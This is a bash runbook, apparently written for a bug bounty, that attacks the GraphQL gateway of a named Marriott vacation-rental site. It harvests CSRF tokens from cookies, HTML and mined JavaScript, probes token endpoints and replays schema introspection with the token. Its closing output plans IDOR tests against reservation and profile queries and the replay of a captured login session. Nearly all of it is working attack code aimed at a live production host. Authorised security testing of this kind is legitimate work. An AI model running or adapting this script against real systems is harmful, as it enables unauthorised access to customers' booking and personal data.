#!/usr/bin/env bash
# =============================================================================
# Marriott — HnV GraphQL CSRF-token acquisition + replay (session38)
# Portable: Linux / Pi / Termux.
#
# s37: /gateway/graphql is the real endpoint; it returns 403 {"message":"CSRF
# token not found"}. A CSRF token is obtainable by any client (it stops cross-
# site, not direct API use). This run discovers HnV's CSRF mechanism (cookie->
# header double-submit, a token endpoint, or an HTML/JS-embedded token), then
# replays introspection + high-value read ops with the token. If reads succeed
# with ONLY a CSRF token (no session), that's unauthenticated data access ->
# IDOR test. If still 401/403 (session required), we know to capture auth next.
#
# SAFETY: in-scope. Read-only queries only (NO mutations). Synthetic/own ids.
# Stop on real third-party PII. X-Bug-Bounty header.
#
# Run (Termux): OUTDIR=$HOME/s38 bash runbooks/PI-RUNBOOK-session38-hnv-csrf.sh \
#                 2>&1 | tee $HOME/s38/s38.log
# =============================================================================
set -eo pipefail

if [ -z "${OUTDIR:-}" ]; then
  if [ -d /tmp ] && [ -w /tmp ]; then OUTDIR=/tmp/s38
  elif [ -n "${TMPDIR:-}" ] && [ -w "${TMPDIR}" ]; then OUTDIR="$TMPDIR/s38"
  else OUTDIR="$HOME/s38"; fi
fi
export OUTDIR
mkdir -p "$OUTDIR"
UA='Mozilla/5.0 (X11; Linux aarch64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36'
IDH='X-Bug-Bounty: hackerone-researcher'
T="homes-and-villas.marriott.com"; B="https://$T"
JAR="$OUTDIR/jar.txt"

echo "============================================================"
echo "HNV CSRF + GRAPHQL  $(date -u '+%Y-%m-%dT%H:%M:%SZ')"
echo "IP: $(curl -s ifconfig.me)   Work: $OUTDIR"
echo "============================================================"
echo ""

echo "═══ PHASE A: LOAD APP, HARVEST COOKIES + EMBEDDED TOKEN ═══"
curl -s -o "$OUTDIR/home.html" -D "$OUTDIR/home.hdr" -c "$JAR" \
  -H "User-Agent: $UA" -H "$IDH" --max-time 25 "$B/" \
  -w '  GET / -> %{http_code} | %{size_download}B\n' || true
echo "  cookies set:"; awk 'NF>=7{print "    "$6" = "substr($7,1,28)"..."}' "$JAR" 2>/dev/null | head -12 || true
echo "  CSRF-ish tokens embedded in HTML:"
grep -oiE '(csrf[_-]?token|xsrf[_-]?token|x-csrf-token|csrfToken)["'"'"': =]{1,4}[A-Za-z0-9_\-]{8,}' "$OUTDIR/home.html" 2>/dev/null | head -6 | sed 's/^/    /' || echo "    none in HTML"
grep -oiE '<meta[^>]*csrf[^>]*>' "$OUTDIR/home.html" 2>/dev/null | head -3 | sed 's/^/    /' || true
echo ""

echo "═══ PHASE B: MINE JS FOR CSRF MECHANISM (header name + token endpoint) ═══"
# pull a couple of main JS bundles and look for csrf header/cookie/endpoint config
python3 - << 'PYEOF'
import os,re
O=os.environ["OUTDIR"]
h=open(os.path.join(O,"home.html"),encoding="utf-8",errors="replace").read() if os.path.exists(os.path.join(O,"home.html")) else ""
js=set(re.findall(r'src=["\']([^"\']+\.m?js)(?:\?[^"\']*)?["\']',h,re.I))
open(os.path.join(O,"js.txt"),"w").write("\n".join(sorted(js)))
print(f"  {len(js)} js refs")
PYEOF
i=0
while read -r J && [ $i -lt 12 ]; do
  [ -z "$J" ] && continue
  case "$J" in http*) U="$J";; /*) U="$B$J";; *) U="$B/$J";; esac
  curl -s --max-time 20 -b "$JAR" -H "User-Agent: $UA" -H "$IDH" "$U" >> "$OUTDIR/alljs.txt" 2>/dev/null || true
  i=$((i+1)); sleep 0.2
done < "$OUTDIR/js.txt"
echo "  mined $(wc -c < "$OUTDIR/alljs.txt" 2>/dev/null||echo 0) bytes JS"
python3 - << 'PYEOF'
import os,re
O=os.environ["OUTDIR"]; js=open(os.path.join(O,"alljs.txt"),encoding="utf-8",errors="replace").read() if os.path.exists(os.path.join(O,"alljs.txt")) else ""
def u(x):
    s=[];[s.append(i) for i in x if i not in s];return s
print("  csrf header names:", u(re.findall(r'["\']([xX]-[cC][sS][rR][fF][-A-Za-z]*|[xX]-[xX][sS][rR][fF]-[tT][oO][kK][eE][nN])["\']',js))[:8])
print("  csrf config keys :", u(re.findall(r'(xsrfHeaderName|xsrfCookieName|csrfHeaderName|csrfCookieName|csrfToken|headerName)["\']?\s*[:=]\s*["\']([^"\']{2,40})["\']',js))[:8])
print("  token endpoints  :", u(re.findall(r'["\'](/[A-Za-z0-9_/-]*(?:csrf|xsrf|token|sanctum/csrf-cookie)[A-Za-z0-9_/-]*)["\']',js))[:10])
PYEOF
echo ""

echo "═══ PHASE C: PROBE CANDIDATE CSRF-TOKEN ENDPOINTS ═══"
for P in /gateway/csrf /gateway/csrf-token /csrf /csrf-token /api/csrf \
         /gateway/graphql /sanctum/csrf-cookie /gateway/token; do
  m=$(curl -s -o "$OUTDIR/cs.txt" -D "$OUTDIR/cs.hdr" -b "$JAR" -c "$JAR" \
       -H "User-Agent: $UA" -H "$IDH" -H 'Accept: application/json' \
       --max-time 15 -w '%{http_code}|%{size_download}' "$B$P" 2>/dev/null || echo "000|0")
  code="${m%|*}"; size="${m#*|}"
  tok=$(grep -ioE '(csrf|xsrf)[^";]{0,40}' "$OUTDIR/cs.hdr" "$OUTDIR/cs.txt" 2>/dev/null | head -1 || true)
  [ "$code" != "404" ] && [ "$code" != "000" ] && printf '  [%s %sB] %s   %s\n' "$code" "$size" "$P" "$tok"
  sleep 0.3
done
# capture any XSRF-TOKEN cookie now in the jar
XSRF=$(awk '/XSRF-TOKEN|csrf|CSRF/{print $7}' "$JAR" 2>/dev/null | tail -1 || true)
echo "  XSRF token from cookie jar: ${XSRF:0:40}${XSRF:+...}"
echo ""

echo "═══ PHASE D: REPLAY GRAPHQL WITH CSRF TOKEN (multiple header positions) ═══"
# URL-decode the cookie token (Laravel/Angular style) for the header value
DEC=$(python3 -c "import urllib.parse,sys;print(urllib.parse.unquote(sys.argv[1]))" "$XSRF" 2>/dev/null || echo "$XSRF")
Q='{"query":"query{__schema{queryType{name} types{name kind}}}"}'
for H in "X-CSRF-Token: $DEC" "X-XSRF-TOKEN: $DEC" "csrf-token: $DEC" "x-csrf-token: $XSRF"; do
  m=$(curl -s -o "$OUTDIR/g.txt" -b "$JAR" -c "$JAR" \
       -H "User-Agent: $UA" -H "$IDH" \
       -H 'Content-Type: application/json' -H 'Accept: application/json' \
       -H "Origin: $B" -H "Referer: $B/" -H "$H" \
       --max-time 20 --data "$Q" \
       -w '%{http_code}|%{size_download}' "$B/gateway/graphql" 2>/dev/null || echo "000|0")
  echo "  hdr[${H%%:*}] -> ${m%|*} | ${m#*|}B :: $(head -c 160 "$OUTDIR/g.txt" | tr '\n' ' ')"
  # if it worked, stop and dump
  if grep -q '"data"' "$OUTDIR/g.txt" 2>/dev/null; then
    echo ""
    echo "  *** CSRF ACCEPTED — GraphQL responded with data. Introspection result:"
    head -c 1200 "$OUTDIR/g.txt"; echo
    cp "$OUTDIR/g.txt" "$OUTDIR/introspection-success.json"
    break
  fi
  sleep 0.4
done
echo ""

echo "════════════════════════════════════════════"
echo "VERDICT / NEXT"
echo "════════════════════════════════════════════"
if [ -f "$OUTDIR/introspection-success.json" ]; then
  echo "  >>> GraphQL reachable with only a CSRF token (no session)."
  echo "  >>> If introspection returned the schema -> map id-bearing queries and"
  echo "  >>> test reservationDetails/getProfileDetails with synthetic id (IDOR)."
else
  echo "  >>> CSRF mechanism not yet matched. Inspect Phase B/C output for the exact"
  echo "  >>> header name + token source, or the token may require an authenticated"
  echo "  >>> session (then capture HnV login via DevTools and replay)."
fi
echo ""
echo "Evidence: $OUTDIR"
echo "Run complete: $(date -u '+%Y-%m-%dT%H:%M:%SZ')"
